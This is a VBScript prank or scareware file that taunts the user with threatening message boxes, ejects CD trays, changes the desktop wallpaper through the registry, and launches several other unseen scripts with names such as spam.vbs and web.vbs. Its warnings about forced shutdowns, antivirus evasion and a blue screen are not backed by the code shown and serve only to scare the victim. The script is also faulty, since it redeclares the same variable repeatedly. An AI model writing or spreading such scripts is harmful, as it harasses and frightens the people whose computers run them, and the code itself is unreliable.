x=msgbox("HI and BYE lol, there is no way to stop it, if you try to end task it will shutdown your computer, if you run an antivirus it will close the program and delete it, if you delete this or go to command prompt it will give you a bsod! BYE LOL", 0+16, "DaveAndBambi.vbs")
Set TI = CreateObject("WMPlayer.OCX.7" )
Set CDROM = TI.cdromCollection
if CDROM.Count >= 1 then
For i = 0 to CDROM.Count - 1
CDROM.Item(i).Eject
Next ' CDTRAY
For i = 0 to CDROM.Count - 1
CDROM.Item(i).Eject
Next ' CDTRAY
End if
x=msgbox("Now the fun really begins...", 0+16, "DaveAndBambi.vbs")
x=msgbox("ENJOY THE BACKROUND LOL!!", 0+16, "DaveAndBambi.vbs")' now the fun really begins
dim wshShell
dim sUserName
Set wshShell = WScript.CreateObject("WScript.Shell")
sUserName = wshShell.ExpandEnvironmentStrings("%USERNAME%")
Set oShell = CreateObject("WScript.Shell")
Set oFSO = CreateObject("Scripting.FileSystemObject")
sWinDir = oFSO.GetSpecialFolder(0)
sWallPaper = "C:\Users\bradl\Pictures\Eapoppopooppo.jpg"
' update in registry
oShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", sWallPaper
' let the system know about the change
oShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True
Function Tilak()
dim shell
set shell=createobject("wscript.shell")
shell.run "spam.bat"
set shell=nothing
End Function
Dim objShell
Set objShell = Wscript.CreateObject("WScript.Shell")
objShell.Run "spam.vbs" 
' Using Set is mandatory
Set objShell = Nothing
Dim objShell
Set objShell = Wscript.CreateObject("WScript.Shell")
objShell.Run "web.vbs" 
' Using Set is mandatory
Set objShell = Nothing
Dim objShell
Set objShell = Wscript.CreateObject("WScript.Shell")
objShell.Run "gsdgsdagedgedgAEs.vbs" 
' Using Set is mandatory
Set objShell = Nothing
Dim objShell
Set objShell = Wscript.CreateObject("WScript.Shell")
objShell.Run "disc.vbs" 
' Using Set is mandatory
Set objShell = Nothing
x=msgbox("Its done my guy", 0+16, "DaveAndBambi.vbs")
x=msgbox("its time to pray for your computer", 0+16, "DaveAndBambi.vbs")
x=msgbox("this is the beginning though", 0+16, "DaveAndBambi.vbs")
x=msgbox("theres way more than your seeing right now", 0+16, "DaveAndBambi.vbs")
x=msgbox("so be prepared", 0+16, "DaveAndBambi.vbs")
Set objShell = Nothing
Dim objShell
Set objShell = Wscript.CreateObject("WScript.Shell")
objShell.Run "moreAAAA.vbs" 
' Using Set is mandatory
Set objShell = Nothing
